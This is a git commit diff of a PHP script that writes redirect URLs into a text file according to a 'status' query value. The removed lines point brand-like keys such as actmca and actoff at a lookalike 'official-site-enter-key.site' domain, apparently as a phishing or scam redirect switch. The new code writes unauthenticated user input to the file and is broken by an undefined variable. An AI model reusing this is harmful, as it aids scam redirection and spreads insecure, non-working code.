f4a33634a966541f46591017233b85a02e43effb
asharfifabrics <69179490+asharfifabrics@users.noreply.github.com>
2021-09-14 16:55:52 +0530

    Update in2.php

--- in2.php
+++ in2.php
@@ -1,89 +1,24 @@
 <?php 
 
+
 if(!empty($_GET['status']))
 {
-    $param = $_GET['status'];
-    if($param == "website")
+    
+    $ArrUrl = $_GET['status'];
+    if(!empty($cfile))
+        
     {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://www.google.com/";
-        fwrite($myfile, $txt);
-        fclose($myfile);
+        $cfile = fopen("newfile.txt", "w") or die("Unable to open file!");
+        $entrurl = $ArrUrl;
+        fwrite($cfile, $entrurl);
+        fclose($cfile);
     }
-    elseif($param == "actnor")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://facebook.com";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "actmca")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actmca/";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "actoff")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actoff/setup_in.php";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "actyou")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "https://official-site-enter-key.site/actyou/";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "actrok")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "logtel")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "logpog")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "logaol")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "mx")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
-    elseif($param == "actweb")
-    {
-        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
-        $txt = "";
-        fwrite($myfile, $txt);
-        fclose($myfile); 
-    }
+    
     else{
         echo "error";
     }
 }
+
 else{
     echo "error";
 }
